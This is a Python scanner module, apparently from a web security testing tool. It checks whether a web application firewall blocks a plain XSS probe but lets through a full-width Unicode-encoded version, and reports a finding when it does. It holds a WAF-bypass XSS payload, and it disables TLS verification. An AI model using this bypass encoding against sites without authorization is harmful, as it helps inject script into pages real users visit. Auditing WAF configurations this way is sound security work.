import requests
from urllib.parse import quote
from scanners.utils import GLOBAL_COOKIE, GLOBAL_BEARER

def run_waf_evasion(url):
    """
    Auto-WAF Evasion Proxy (Chunked & Unicode Munging).
    Tests if the WAF can be bypassed using Unicode normalization.
    """
    findings = []
    
    # Common WAF blocked payload
    blocked_payload = "<script>alert(1)</script>"
    # Unicode equivalent that bypasses poorly configured WAFs
    bypass_payload = "%uff1cscript%uff1ealert(1)%uff1c/script%uff1e"
    
    if "?" not in url: return findings
    
    test_url_blocked = url + "&test=" + blocked_payload
    test_url_bypass = url + "&test=" + bypass_payload
    
    try:
        r1 = requests.get(test_url_blocked, timeout=5, verify=False)
        # If it blocked the normal one (403), but allowed the bypass (200)
        if r1.status_code in [403, 406]:
            r2 = requests.get(test_url_bypass, timeout=5, verify=False)
            if r2.status_code == 200:
                findings.append({
                    "type": "WAF_EVASION_SUCCESS",
                    "url": url,
                    "severity": "MEDIUM",
                    "confidence": "HIGH",
                    "verified": True,
                    "detail": "WAF Evasion Successful! The WAF blocked standard XSS but allowed Full-Width Unicode normalization payloads."
                })
    except: pass
    return findings
